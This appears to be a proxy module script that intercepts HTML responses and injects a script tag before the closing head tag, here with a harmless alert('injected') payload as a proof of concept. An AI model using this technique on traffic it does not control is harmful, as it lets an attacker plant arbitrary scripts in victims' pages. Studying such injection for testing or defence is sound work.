function onResponse(req, res) {
    if (res.ContentType.indexOf('text/html') == 0) {
        var body = res.ReadBody();
        res.Body = body.replace('</head>',
            '<script>alert("injected")</script></head>');
    }
}
